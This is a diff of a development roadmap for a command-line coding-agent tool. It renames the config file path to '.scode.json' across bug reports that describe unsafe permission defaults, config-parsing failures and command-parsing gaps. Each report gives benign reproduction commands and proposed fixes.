+     **Acceptance.** `cd /tmp/cdGG/nested/deep/dir && scode --output-format json status` with `.scode.json` at `/tmp/cdGG/.scode.json` exposes `permission_mode: "read-only"` (config honored from project root), not `danger-full-access` (fallback). `doctor` reports `Config files loaded 1/N` with the project-root config file discovered. `cd /tmp/cdGG/nested && echo '{"model":"opus"}' > .scode.json` produces a discoverable overlay. Running from any subdirectory yields deterministic per-workspace config resolution. Documentation explains the policy.
 
      **Blocker.** None. `project_root_for` helper trivially reusable from the git-root walker. Discovery list is additive — adding ancestor entries doesn't break existing cwd-anchored configs. Most invasive piece is the architectural decision: walk-to-project-root + cwd-overlay (this proposal), or walk-every-ancestor-like-CLAUDE.md (#85's current over-broad policy), or unify both under a single policy.
 
@@ -3637,7 +3637,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdNN` and `/tmp/cdOO` on main HEAD `43eac4d` in response to Sudocodehip pinpoint nudge at `1494895272936079493`. Joins **Session-handling** (#93, #112, #113) — now 4 items: reference-resolution semantics (#93), concurrent-modification (#112), programmatic management gap (#113), and reference/enumeration asymmetry (#114). Complete session-handling cluster. Joins **Truth-audit / diagnostic-integrity** on the `/session list` output being factually wrong. Cross-cluster with **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108) — #114 adds "entry points that read the same underlying data produce mutually inconsistent identifiers." Natural bundle: **#93 + #112 + #113 + #114** (session-handling quartet — complete coverage). Alternative: **#104 + #114** — /clear filename semantics + /export filename semantics both hide session identity in the filename rather than the content. Session tally: ROADMAP #114.
 
-115. **`scode init` generates `.nexus/sudocode.json` with `"permissions": {"defaultMode": "dontAsk"}` — where "dontAsk" is an alias for `danger-full-access`, hardcoded in `rust/crates/runtime/src/config.rs:858`. The init output is prose-only with zero mention of "danger", "permission", or "access" — an agent (or human) running `scode init` in a fresh project gets no signal that the generated config turns permissions off. `scode init --output-format json` returns `{kind: "init", message: "<multi-line prose with \n literals>"}` instead of structured `{files_created: [...], defaultMode: "dontAsk", security_posture: "danger-full-access"}`. The alias choice itself ("dontAsk") obscures the behavior: a user seeing `"defaultMode": "dontAsk"` in their new repo naturally reads it as "don't ask me to confirm" — NOT "grant every tool every permission unconditionally" — but the two are identical per the parser at `config.rs:858`. `scode init` is effectively a silent bootstrap to maximum-permissions mode** — dogfooded 2026-04-18 on main HEAD `ca09b6b` from `/tmp/cdPP`.
+115. **`scode init` generates `.scode.json` with `"permissions": {"defaultMode": "dontAsk"}` — where "dontAsk" is an alias for `danger-full-access`, hardcoded in `rust/crates/runtime/src/config.rs:858`. The init output is prose-only with zero mention of "danger", "permission", or "access" — an agent (or human) running `scode init` in a fresh project gets no signal that the generated config turns permissions off. `scode init --output-format json` returns `{kind: "init", message: "<multi-line prose with \n literals>"}` instead of structured `{files_created: [...], defaultMode: "dontAsk", security_posture: "danger-full-access"}`. The alias choice itself ("dontAsk") obscures the behavior: a user seeing `"defaultMode": "dontAsk"` in their new repo naturally reads it as "don't ask me to confirm" — NOT "grant every tool every permission unconditionally" — but the two are identical per the parser at `config.rs:858`. `scode init` is effectively a silent bootstrap to maximum-permissions mode** — dogfooded 2026-04-18 on main HEAD `ca09b6b` from `/tmp/cdPP`.
 
      **Concrete repro.**
      ```
@@ -3646,7 +3646,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      Init
        Project          /private/tmp/cdPP
        .nexus/sudocode/           created
-       .nexus/sudocode.json       created
+       .scode.json       created
        .gitignore       created
        CLAUDE.md        created
        Next step        Review and tailor the generated guidance
@@ -3656,11 +3656,11 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      # Actually: scode init produces its own structured output:
      {
        "kind": "init",
-       "message": "Init\n  Project          /private/tmp/cdPP\n  .nexus/sudocode/           created\n  .nexus/sudocode.json       created\n..."
+       "message": "Init\n  Project          /private/tmp/cdPP\n  .nexus/sudocode/           created\n  .scode.json       created\n..."
      }
      # The entire init report is a \n-embedded prose blob inside `message`.
 
-     $ cat .nexus/sudocode.json
+     $ cat .scode.json
      {
        "permissions": {
          "defaultMode": "dontAsk"
@@ -3669,7 +3669,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      $ scode status --output-format json | python3 -c "import json,sys; d=json.load(sys.stdin); print('permission_mode:', d['permission_mode'])"
      permission_mode: danger-full-access
-     # "dontAsk" in .nexus/sudocode.json resolves to danger-full-access at load time.
+     # "dontAsk" in .scode.json resolves to danger-full-access at load time.
 
      $ scode init 2>&1 | grep -iE "danger|permission|access"
      (nothing)
@@ -3708,14 +3708,14 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Fix shape — change the default, expose the resolution, structure the JSON.**
      1. *Change `STARTER_SCODE_JSON` default.* Options: (a) `"defaultMode": "default"` (prompt for destructive actions). (b) `"defaultMode": "plan"` (plan-first). (c) Leave permissions block out entirely and fall back to whatever the unconfigured-default should be (currently #87's gap). **Recommendation: (a) — explicit safe default. Users who WANT danger-full-access can opt in.** ~5-line change.
-     2. *Warn in init output when the generated config implies elevated permissions.* If the effective mode resolves to `DangerFullAccess`, the init summary should include a one-line security annotation: `security: danger-full-access (unconditional tool approval). Change .nexus/sudocode.json permissions.defaultMode to 'default' to require prompting.` ~15 lines.
+     2. *Warn in init output when the generated config implies elevated permissions.* If the effective mode resolves to `DangerFullAccess`, the init summary should include a one-line security annotation: `security: danger-full-access (unconditional tool approval). Change .scode.json permissions.defaultMode to 'default' to require prompting.` ~15 lines.
      3. *Structure the init JSON output.* Replace the prose `message` field with:
         ```json
         {
           "kind": "init",
           "files": [
             {"path": ".nexus/sudocode/", "action": "created"},
-            {"path": ".nexus/sudocode.json", "action": "created"},
+            {"path": ".scode.json", "action": "created"},
             {"path": ".gitignore", "action": "created"},
             {"path": "CLAUDE.md", "action": "created"}
           ],
@@ -3734,13 +3734,13 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdPP` on main HEAD `ca09b6b` in response to Sudocodehip pinpoint nudge at `1494917922076889139`. Joins **Permission-audit / tool-allow-list** (#94, #97, #101, #106) as 5th member — this is the init-time ANCHOR of the permission-posture problem: #87 is absence-of-config, #101 is fail-OPEN on bad env var, **#115** is the init-generated dangerous default. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111) on the third axis: not a silent flag, but a silent setting (the generated config's security implications are silent in the init output). Cross-cluster with **Reporting-surface / config-hygiene** (#90, #91, #92, #110) on the structured-data-vs-prose axis: `scode init --output-format json` wraps all structure inside `message`. Cross-cluster with **Truth-audit** on "Next step: Review and tailor the generated guidance" phrasing — misleads by omission. Natural bundle: **#87 + #101 + #115** — "permission drift at every boundary": absence default + env-var bypass + init-generated default. Also: **#50 + #87 + #91 + #94 + #97 + #101 + #115** — flagship permission-audit sweep now 7-way. Session tally: ROADMAP #115.
 
-116. **Unknown keys in `.nexus/sudocode.json` are strict ERRORS, not warnings — `scode` hard-fails at startup with exit 1 if any field is unrecognized. Only the FIRST error is reported; all subsequent validation messages are lost. Valid Claude Code config fields (`apiKeyHelper`, `env`, and other Claude-Code-native keys) trigger the same hard-fail, so a user renaming `.claude.json → .nexus/sudocode.json` for migration gets `"unknown key \"apiKeyHelper\"" ... exit 1` with zero guidance on what to delete. The error goes to stderr as structured JSON (`{"type":"error","error":"..."}`) but a `--output-format json` consumer has to read BOTH stdout AND stderr to capture success-or-error — the stdout side is empty on error. There is no `--ignore-unknown-config` flag, no `strict` vs `warn` mode toggle, no forward-compat path — an agent's future-self putting a single new field in the config kills every older scode binary** — dogfooded 2026-04-18 on main HEAD `ad02761` from `/tmp/cdRR`.
+116. **Unknown keys in `.scode.json` are strict ERRORS, not warnings — `scode` hard-fails at startup with exit 1 if any field is unrecognized. Only the FIRST error is reported; all subsequent validation messages are lost. Valid Claude Code config fields (`apiKeyHelper`, `env`, and other Claude-Code-native keys) trigger the same hard-fail, so a user renaming `.claude.json → .scode.json` for migration gets `"unknown key \"apiKeyHelper\"" ... exit 1` with zero guidance on what to delete. The error goes to stderr as structured JSON (`{"type":"error","error":"..."}`) but a `--output-format json` consumer has to read BOTH stdout AND stderr to capture success-or-error — the stdout side is empty on error. There is no `--ignore-unknown-config` flag, no `strict` vs `warn` mode toggle, no forward-compat path — an agent's future-self putting a single new field in the config kills every older scode binary** — dogfooded 2026-04-18 on main HEAD `ad02761` from `/tmp/cdRR`.
 
      **Concrete repro.**
      ```
      # Forward-compat scenario — config has a "future" field:
      $ cd /tmp/cdRR && git init -q .
-     $ cat > .nexus/sudocode.json << 'EOF'
+     $ cat > .scode.json << 'EOF'
      {
        "permissions": {"defaultMode": "default"},
        "futureField": "some-feature"
@@ -3748,11 +3748,11 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      EOF
      $ scode --output-format json status
      # stdout: (empty)
-     # stderr: {"type":"error","error":"/private/tmp/cdRR/.nexus/sudocode.json: unknown key \"futureField\" (line 3)"}
+     # stderr: {"type":"error","error":"/private/tmp/cdRR/.scode.json: unknown key \"futureField\" (line 3)"}
      # exit: 1
 
-     # Claude Code migration scenario — rename .claude.json to .nexus/sudocode.json:
-     $ cat > .nexus/sudocode.json << 'EOF'
+     # Claude Code migration scenario — rename .claude.json to .scode.json:
+     $ cat > .scode.json << 'EOF'
      {
        "permissions": {"defaultMode": "default"},
        "apiKeyHelper": "/usr/local/bin/key-helper",
@@ -3760,11 +3760,11 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      }
      EOF
      $ scode --output-format json status
-     # stderr: {"type":"error","error":"/private/tmp/cdRR/.nexus/sudocode.json: unknown key \"apiKeyHelper\""}
+     # stderr: {"type":"error","error":"/private/tmp/cdRR/.scode.json: unknown key \"apiKeyHelper\""}
      # apiKeyHelper is a real Claude Code config field. sudo-code refuses it.
 
      # Multiple unknowns — only the first is reported:
-     $ cat > .nexus/sudocode.json << 'EOF'
+     $ cat > .scode.json << 'EOF'
      {
        "a_bad": 1,
        "b_bad": 2,
@@ -3808,7 +3808,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      **Why this is specifically a automatability gap.**
      1. *Forward-compat is impossible.* If an agent upgrade adds a new config field, any older binary (CI cache, legacy nodes, stuck deployments) hard-fails on the new field. This is the opposite of how tools like `cargo`, `jq`, most JSON APIs, and every serde-derived Rust config loader handle unknowns (warn or silently accept by default).
      2. *Only `errors[0]` is reported per run.* Fixing N unknown fields requires N edit-run-fix cycles. An agent running `scode status` inside a validation loop has to re-invoke for every unknown. This joins #109 where only the first error surfaces structurally; the rest are discarded.
-     3. *Claude Code migration parity is broken.* The README and user docs for sudo-code position it as Claude-Code-compatible. Users who literally `cp .claude.json .nexus/sudocode.json` get immediate hard-fail on `apiKeyHelper`, `env`, and other legitimate Claude Code fields. No graceful "this is a Claude Code field we don't support, ignored" message.
+     3. *Claude Code migration parity is broken.* The README and user docs for sudo-code position it as Claude-Code-compatible. Users who literally `cp .claude.json .scode.json` get immediate hard-fail on `apiKeyHelper`, `env`, and other legitimate Claude Code fields. No graceful "this is a Claude Code field we don't support, ignored" message.
      4. *Error-routing split.* With `--output-format json`, success goes to stdout, errors go to stderr. Claws orchestrating scode must capture both streams and correlate. An agent that `scode status | jq .permission_mode` silently gets empty output when config is broken — the error is invisible to the pipe consumer.
      5. *Joins #109 (validation warnings stderr-only).* #109 said warnings are prose-on-stderr and the structured form is discarded. #116 adds: errors also go to stderr (structured as JSON this time, good), but in a hard-fail way that prevents the stdout channel from emitting ANYTHING. An agent gets either pure-JSON success or empty-stdout + JSON-error-stderr; it must always read both.
      6. *No strict-vs-lax mode.* Tools that support forward-compat typically have two modes: strict (reject unknown) for production, lax (warn on unknown) for developer workflows. sudo-code has neither toggle; it's strict always.
@@ -3816,14 +3816,14 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Fix shape — make unknown keys warnings by default, add explicit strict mode, collect all errors per run.**
      1. *Downgrade `DiagnosticKind::UnknownKey` from Error to Warning by default.* The parser still surfaces the diagnostic; the CLI just doesn't halt on it. ~5 lines.
-     2. *Add `strict` mode flag.* `.nexus/sudocode.json` top-level `{"strictValidation": true}` OR `--strict-config` CLI flag. When set, unknown keys become errors as today. Default: off. ~15 lines.
+     2. *Add `strict` mode flag.* `.scode.json` top-level `{"strictValidation": true}` OR `--strict-config` CLI flag. When set, unknown keys become errors as today. Default: off. ~15 lines.
      3. *Collect all diagnostics, don't halt on first.* Replace `errors[0]` return with full `errors: [...]` collection, then decide fatal-or-not based on severity + strict-mode flag. ~20 lines.
      4. *Recognize Claude-Code-native fields as explicit no-ops.* Add `apiKeyHelper`, `env`, and other known Claude Code fields to a `TOLERATED_CLAUDE_CODE_FIELDS` allow-list that emits a migration-hint warning: `"apiKeyHelper" is a Claude Code field not yet supported by sudo-code; ignored.` ~30 lines.
      5. *Include structured errors in the `--output-format json` stdout payload on hard fail.* Currently `{"type":"error","error":"..."}` goes to stderr and stdout is empty. Emit a machine-readable error envelope on stdout as well (or exclusively), with `config_diagnostics: [{level, field, location, message}]`. Keep stderr human-readable. ~15 lines.
      6. *Add suggestion-by-default for UnknownKey.* The parser already supports `suggestion: Option<String>` in the DiagnosticKind — wire it to a fuzzy-match across the schema. `"permisions"` → `"permissions"` suggestion. ~15 lines.
      7. *Regression tests.* (a) Forward-compat config with novel field loads without error. (b) Strict mode opt-in rejects unknown. (c) All diagnostics reported, not just first. (d) apiKeyHelper + env + other Claude Code fields produce migration-hint warning, not hard-fail. (e) `--output-format json` stdout contains error envelope on validation failure.
 
-     **Acceptance.** `cp .claude.json .nexus/sudocode.json && scode status` loads without hard-fail and emits a migration-hint warning for each Claude-Code-native field. `echo '{"newFutureField": 1}' > .nexus/sudocode.json && scode status` loads with a single warning, not a fatal error. `scode --strict-config status` retains today's strict behavior. All diagnostics are reported, not just `errors[0]`. `--output-format json` emits errors on stdout in addition to stderr.
+     **Acceptance.** `cp .claude.json .scode.json && scode status` loads without hard-fail and emits a migration-hint warning for each Claude-Code-native field. `echo '{"newFutureField": 1}' > .scode.json && scode status` loads with a single warning, not a fatal error. `scode --strict-config status` retains today's strict behavior. All diagnostics are reported, not just `errors[0]`. `--output-format json` emits errors on stdout in addition to stderr.
 
      **Blocker.** Policy decision: does the project want strict-by-default (current) or lax-by-default? The fix shape assumes lax-by-default with strict opt-in, matching industry-standard forward-compat conventions and easing Claude Code migration.
 
@@ -3923,7 +3923,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Blocker.** None. Parser refactor is localized to one arm. Compatibility concern: anyone currently relying on `-p` greedy absorption (unlikely because it's silently-broken) would see a behavior change. Deprecation warning for one release softens the transition.
 
-     **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdSS` on main HEAD `f2d6538` in response to Sudocodehip pinpoint nudge at `1494933025857736836`. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111, #115, #116) as 12th member — `-p` is an undocumented-in-`--help` shortcut whose silent greedy behavior makes flag-order semantics invisible. Joins **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108, #114) as 7th — three entry points (`scode prompt TEXT`, bare positional `scode TEXT`, `scode -p TEXT`) with subtly different arg-parsing semantics. Joins **Truth-audit** — the parser is lying about what it parsed when `-p` is present. Joins **Claude Code migration parity** (#103, #109, #116) as 4th — users migrating `claude -p "..." --model ..."` silently get corrupted prompts. Cross-cluster with **Silent-flag** quartet (#96, #98, #108, #111) now quintet: #108 (subcommand typos fall through to Prompt, burning billed tokens) + **#117** (prompt flags swallowed into prompt text, ALSO burning billed tokens) — both are silent-token-burn failure modes. Natural bundle: **#108 + #117** — billable-token silent-burn pair: typo fallthrough + flag-swallow. Also **#105 + #108 + #117** — model-resolution triangle: `scode status` ignores .nexus/sudocode.json model (#105) + typo'd `scode statuss` burns tokens (#108) + `-p "test" --model sonnet` silently ignores the model (#117). Session tally: ROADMAP #117.
+     **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdSS` on main HEAD `f2d6538` in response to Sudocodehip pinpoint nudge at `1494933025857736836`. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111, #115, #116) as 12th member — `-p` is an undocumented-in-`--help` shortcut whose silent greedy behavior makes flag-order semantics invisible. Joins **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108, #114) as 7th — three entry points (`scode prompt TEXT`, bare positional `scode TEXT`, `scode -p TEXT`) with subtly different arg-parsing semantics. Joins **Truth-audit** — the parser is lying about what it parsed when `-p` is present. Joins **Claude Code migration parity** (#103, #109, #116) as 4th — users migrating `claude -p "..." --model ..."` silently get corrupted prompts. Cross-cluster with **Silent-flag** quartet (#96, #98, #108, #111) now quintet: #108 (subcommand typos fall through to Prompt, burning billed tokens) + **#117** (prompt flags swallowed into prompt text, ALSO burning billed tokens) — both are silent-token-burn failure modes. Natural bundle: **#108 + #117** — billable-token silent-burn pair: typo fallthrough + flag-swallow. Also **#105 + #108 + #117** — model-resolution triangle: `scode status` ignores .scode.json model (#105) + typo'd `scode statuss` burns tokens (#108) + `-p "test" --model sonnet` silently ignores the model (#117). Session tally: ROADMAP #117.
 
 118. **Three slash commands — `/stats`, `/tokens`, and `/cache` — all collapse to `SlashCommand::Stats` at `commands/src/lib.rs:1405` (`"stats" | "tokens" | "cache" => SlashCommand::Stats`), returning bit-identical output (`{"kind":"stats", ...}`) despite `--help` advertising three distinct capabilities: `/stats` = "Show workspace and session statistics", `/tokens` = "Show token count for the current conversation", `/cache` = "Show prompt cache statistics". An agent invoking `/cache` expecting cache-focused output gets a grab-bag that says `kind: "stats"` — not even `kind: "cache"`. An agent invoking `/tokens` expecting a focused token report gets the same grab-bag labeled `kind: "stats"`. This is the 2-dimensional-superset of #111 (2-way dispatch collapse) — #118 is a 3-way collapse where each collapsed alias has a DIFFERENT help description, compounding the documentation-vs-implementation gap** — dogfooded 2026-04-18 on main HEAD `b9331ae` from `/tmp/cdTT`.
 
@@ -4106,7 +4106,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdUU` on main HEAD `3848ea6` in response to Sudocodehip pinpoint nudge at `1494948121099243550`. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111, #115, #116, #117, #118) as 14th member — the fall-through to Prompt is silent. Joins **Claude Code migration parity** (#103, #109, #116, #117) as 5th member — users coming from Claude Code muscle-memory for `claude <verb> --help` get silently billed. Joins **Truth-audit / diagnostic-integrity** — the CLI claims "missing credentials" but the true cause is "your CLI invocation was interpreted as a chat prompt." Cross-cluster with **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108, #114, #117) — another entry point (slash-verb + args) that differs from the same verb bare. Natural bundle: **#108 + #117 + #119** — billable-token silent-burn triangle: typo fallthrough (#108) + flag swallow (#117) + known-slash-verb-with-args fallthrough (#119). All three are silent-money-burn failure modes with the same underlying cause: too-narrow parser detection + greedy Prompt dispatch. Also **#108 + #111 + #118 + #119** — parser-level trust gap quartet: typo fallthrough (#108) + 2-way slash collapse (#111) + 3-way slash collapse (#118) + known-slash-verb fallthrough (#119). Session tally: ROADMAP #119.
 
-120. **`.nexus/sudocode.json` is parsed by a custom JSON-ish parser (`JsonValue::parse` in `rust/crates/runtime/src/json.rs`) that accepts trailing commas (one), but silently drops files containing line comments, block comments, unquoted keys, UTF-8 BOM, single quotes, hex numbers, leading commas, or multiple trailing commas. The user sees `.nexus/sudocode.json` behave partially like JSON5 (trailing comma works) and reasonably assumes JSON5 tolerance. Comments or unquoted keys — the two most common JSON5 conveniences a developer would reach for — silently cause the entire config to be dropped with ZERO stderr, exit 0, `loaded_config_files: 0`. Since the no-config default is `danger-full-access` per #87, a commented-out `.nexus/sudocode.json` with `"defaultMode": "default"` silently UPGRADES permissions from intended `read-only` to `danger-full-access` — a security-critical semantic flip from the user's expressed intent to the polar opposite** — dogfooded 2026-04-18 on main HEAD `7859222` from `/tmp/cdVV`. Extends #86 (silent-drop) with the JSON5-partial-tolerance + alias-collapse angle.
+120. **`.scode.json` is parsed by a custom JSON-ish parser (`JsonValue::parse` in `rust/crates/runtime/src/json.rs`) that accepts trailing commas (one), but silently drops files containing line comments, block comments, unquoted keys, UTF-8 BOM, single quotes, hex numbers, leading commas, or multiple trailing commas. The user sees `.scode.json` behave partially like JSON5 (trailing comma works) and reasonably assumes JSON5 tolerance. Comments or unquoted keys — the two most common JSON5 conveniences a developer would reach for — silently cause the entire config to be dropped with ZERO stderr, exit 0, `loaded_config_files: 0`. Since the no-config default is `danger-full-access` per #87, a commented-out `.scode.json` with `"defaultMode": "default"` silently UPGRADES permissions from intended `read-only` to `danger-full-access` — a security-critical semantic flip from the user's expressed intent to the polar opposite** — dogfooded 2026-04-18 on main HEAD `7859222` from `/tmp/cdVV`. Extends #86 (silent-drop) with the JSON5-partial-tolerance + alias-collapse angle.
 
      **Concrete repro.**
      ```
@@ -4114,7 +4114,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      # + resolved permission_mode:
 
      # Accepted (loaded, permission = read-only):
-     $ cat > .nexus/sudocode.json << EOF
+     $ cat > .scode.json << EOF
      {
        "permissions": {
          "defaultMode": "default",
@@ -4126,7 +4126,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      # Single trailing comma: OK.
 
      # SILENTLY DROPPED (loaded=0, permission = danger-full-access — security flip):
-     $ cat > .nexus/sudocode.json << EOF
+     $ cat > .scode.json << EOF
      {
        // legacy convention — should be OK
        "permissions": {"defaultMode": "default"}
@@ -4140,11 +4140,11 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      # stderr: empty
 
      # Same for block comments, unquoted keys, BOM, single quotes:
-     $ printf '\xef\xbb\xbf{"permissions":{"defaultMode":"default"}}' > .nexus/sudocode.json
+     $ printf '\xef\xbb\xbf{"permissions":{"defaultMode":"default"}}' > .scode.json
      $ scode status --output-format json | jq '{loaded: .workspace.loaded_config_files, mode: .permission_mode}'
      {"loaded": 0, "mode": "danger-full-access"}
 
-     $ cat > .nexus/sudocode.json << EOF
+     $ cat > .scode.json << EOF
      {
        permissions: { defaultMode: "default" }
      }
@@ -4158,7 +4158,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      **Trace path.**
      - `rust/crates/runtime/src/config.rs:674-692` — `read_optional_json_object`:
        ```rust
-       let is_legacy_config = path.file_name().and_then(|name| name.to_str()) == Some(".nexus/sudocode.json");
+       let is_legacy_config = path.file_name().and_then(|name| name.to_str()) == Some(".scode.json");
        // ...
        let parsed = match JsonValue::parse(&contents) {
            Ok(parsed) => parsed,
@@ -4166,7 +4166,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
            Err(error) => return Err(ConfigError::Parse(format!("{}: {error}", path.display()))),
        };
        ```
-       Parse failure on `.nexus/sudocode.json` specifically returns `Ok(None)` (legacy-compat swallow). #86 already covered this. **#120 extends** with the observation that the custom `JsonValue::parse` has a JSON5-partial acceptance profile — trailing comma tolerated, everything else rejected — and the silent-drop hides that inconsistency from the user.
+       Parse failure on `.scode.json` specifically returns `Ok(None)` (legacy-compat swallow). #86 already covered this. **#120 extends** with the observation that the custom `JsonValue::parse` has a JSON5-partial acceptance profile — trailing comma tolerated, everything else rejected — and the silent-drop hides that inconsistency from the user.
      - `rust/crates/runtime/src/json.rs` — `JsonValue::parse`. Custom parser. Accepts trailing comma at object/array end. Rejects comments (`//`, `/* */`), unquoted keys, single quotes, hex numbers, BOM, leading commas.
      - `rust/crates/runtime/src/config.rs:856-858` — the permission-mode alias table:
        ```rust
@@ -4176,7 +4176,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
        ```
        **Crucial semantic surprise**: `"default"` maps to `ReadOnly`. But the no-config default (per #87) maps to `DangerFullAccess`. "Default in the config file" and "no config at all" are **opposite** modes. A user who writes `"defaultMode": "default"` thinks they're asking for whatever the system default is; they're actually asking for the SAFEST mode. Meanwhile the actual system default on no-config-at-all is the DANGEROUS mode.
      - #120's security amplification chain:
-       1. User writes `.nexus/sudocode.json` with a comment + `"defaultMode": "default"`. Intent: read-only.
+       1. User writes `.scode.json` with a comment + `"defaultMode": "default"`. Intent: read-only.
        2. `JsonValue::parse` rejects comments, returns parse error.
        3. `read_optional_json_object` sees `is_legacy_config`, silently returns `Ok(None)`.
        4. Config loader treats as "no config present."
@@ -4187,23 +4187,23 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      1. *Silent security inversion.* The fail-mode isn't "fail closed" (default to strict) — it's "fail to the WORST possible mode." A user's attempt to EXPRESS an intent-to-be-safe silently produces the-opposite. An agent validating `scode status` for "permission_mode = read-only" sees `danger-full-access` and has no way to understand why.
      2. *JSON5-partial acceptance creates a footgun.* If the parser rejected ALL JSON5 features, users would learn "strict JSON only" quickly. If it accepted ALL JSON5 features, users would have consistent behavior. Accepting ONLY trailing commas gives a false signal of JSON5 tolerance, inviting the lethal (comments/unquoted) misuse.
      3. *Alias table collapse "default" → ReadOnly is counterintuitive.* Most users read `"defaultMode": "default"` as "whatever the default mode is." In sudo-code it means specifically `ReadOnly`. The literal word "default" is overloaded.
-     4. *Joins truth-audit.* `loaded_config_files: 0` reports truthfully that 0 files loaded. But `permission_mode: danger-full-access` without any accompanying `config_parse_errors: [...]` fails to explain WHY. An agent sees "no config loaded, dangerous default" and has no signal that the user's `.nexus/sudocode.json` WAS present but silently dropped.
+     4. *Joins truth-audit.* `loaded_config_files: 0` reports truthfully that 0 files loaded. But `permission_mode: danger-full-access` without any accompanying `config_parse_errors: [...]` fails to explain WHY. An agent sees "no config loaded, dangerous default" and has no signal that the user's `.scode.json` WAS present but silently dropped.
      5. *Joins #86 (silent-drop) at a new angle.* #86 covers the general shape. #120 adds: the acceptance profile is inconsistent (accepts trailing comma, rejects comments) and the fallback is to `DangerFullAccess`, not to `ReadOnly`. These two facts compose into a security-critical user-intent inversion.
      6. *Cross-cluster with #87 (no-config default = DangerFullAccess) and #115 (`scode init` generates `dontAsk` = DangerFullAccess)* — three axes converging on the same problem: **the system defaults are inverted from what the word "default" suggests**. Whether the user writes no config, runs init, or writes broken config, they end up at `DangerFullAccess`. That's only safe if the user explicitly opts OUT to `"defaultMode": "default"` / `ReadOnly` AND the config successfully parses.
      7. *Claude Code migration parity double-break.* Claude Code's `.claude.json` is strict JSON. #116 showed sudo-code rejects valid Claude Code keys with hard-fail. **#120 shows sudo-code ALSO accepts non-JSON trailing commas that Claude Code would reject.** So sudo-code is strict-where-Claude-was-lax AND lax-where-Claude-was-strict — maximum confusion for migrating users.
 
      **Fix shape — reject JSON5 consistently OR accept JSON5 consistently; eliminate the silent-drop; clarify the alias table.**
      1. *Decide the acceptance policy: strict JSON or explicit JSON5.* Rust ecosystem: `serde_json` is strict by default, `json5` crate supports JSON5. Pick one, document it, enforce it. If keeping the custom parser: remove trailing-comma acceptance OR add comment/unquoted/BOM/single-quote acceptance. Stop being partial. ~30 lines either direction.
-     2. *Replace the `is_legacy_config` silent-drop with warn-and-continue (already covered by #86 fix shape).* Apply #86's fix here too: any parse failure on `.nexus/sudocode.json` surfaces a structured warning. ~20 lines (overlaps with #86).
+     2. *Replace the `is_legacy_config` silent-drop with warn-and-continue (already covered by #86 fix shape).* Apply #86's fix here too: any parse failure on `.scode.json` surfaces a structured warning. ~20 lines (overlaps with #86).
      3. *Rename the `"default"` permission mode alias or eliminate it.* Options: (a) map `"default"` → `"ask"` (prompt for every destructive action, matching user expectation). (b) Rename `"default"` → `"read-only"` in docs and deprecate `"default"` as an alias. (c) Make `"default"` = the ACTUAL system default (currently `DangerFullAccess`), matching the meaning of the English word, and let users explicitly specify `"read-only"` if that's what they want. ~10 lines + documentation.
      4. *Structure the `status` output to show config-drop state.* Add `config_parse_errors: [...]`, `discovered_files_count`, `loaded_files_count` all as top-level or under `workspace.config`. An agent can cross-check `discovered > loaded` to detect silent drops without parsing warnings from stderr. ~20 lines.
      5. *Regression tests.*
-        - (a) `.nexus/sudocode.json` with comment → structured warning, `loaded_config_files: 0`, NOT `permission_mode: danger-full-access` unless config explicitly says so.
-        - (b) `.nexus/sudocode.json` with `"defaultMode": "default"` → `permission_mode: read-only` (existing behavior) OR `ask` (after rename).
-        - (c) No `.nexus/sudocode.json` + no env var → `permission_mode` resolves to a documented explicit default (safer than `danger-full-access`; or keep `danger-full-access` with loud doctor warning).
+        - (a) `.scode.json` with comment → structured warning, `loaded_config_files: 0`, NOT `permission_mode: danger-full-access` unless config explicitly says so.
+        - (b) `.scode.json` with `"defaultMode": "default"` → `permission_mode: read-only` (existing behavior) OR `ask` (after rename).
+        - (c) No `.scode.json` + no env var → `permission_mode` resolves to a documented explicit default (safer than `danger-full-access`; or keep `danger-full-access` with loud doctor warning).
         - (d) JSON5 acceptance matrix: pick a policy, test every case.
 
-     **Acceptance.** `scode status --output-format json` on a `.nexus/sudocode.json` with a parse error surfaces `config_parse_errors` in the structured output. Acceptance profile for `.nexus/sudocode.json` is consistent (strict JSON, OR explicit JSON5). The phrase "defaultMode: default" resolves to a mode that matches the English meaning of the word "default," not its most-aggressive alias. A user's attempt to express an intent-to-be-safe never produces a DangerFullAccess runtime without explicit stderr + JSON surface telling them so.
